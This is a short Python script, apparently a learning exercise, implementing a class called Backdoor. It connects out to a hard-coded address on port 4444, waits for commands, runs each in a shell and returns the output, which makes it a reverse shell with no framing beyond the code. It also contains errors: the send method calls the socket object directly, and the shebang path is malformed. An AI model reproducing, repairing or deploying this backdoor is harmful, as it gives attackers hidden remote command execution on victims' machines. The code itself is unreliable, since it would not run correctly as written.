#!usr/bin/python

import subprocess
import socket, json

class Backdoor:
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))
    
    def exe_remort_command(self,command):
        return subprocess.check_output(command,shell=True)
    
    def reliable_send(self,data):
        json_data = json.dumps(data)
        return self.connection(json_data)
    
    def reliable_receive(self):
        json_data = self.connection.recv(1024)
        return json.loads(json_data)

    def run(self):
        while True:
            command = self.reliable_receive()
            result = self.exe_remort_command(command)
            self.reliable_send(result)
        self.connection.close()
        
ip = "192.168.10.10"
port = 4444

backdoor = Backdoor(ip,port)
backdoor.run()